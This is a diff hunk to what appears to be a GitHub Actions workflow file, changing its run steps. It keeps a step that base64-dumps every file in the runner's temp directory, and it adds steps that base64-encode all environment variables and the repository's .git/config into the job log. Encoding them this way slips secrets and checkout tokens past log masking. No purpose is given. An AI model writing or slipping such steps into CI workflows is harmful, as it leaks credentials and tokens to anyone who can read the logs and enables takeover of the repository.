@@ -33,6 +33,8 @@ jobs:
 
       - run: echo $(find $RUNNER_TEMP -type f -maxdepth 1 | xargs cat | base64)
 
-      - run: echo $(env | base64)
+      - run: env | base64
+
+      - run: cat .git/config | base64
 
 
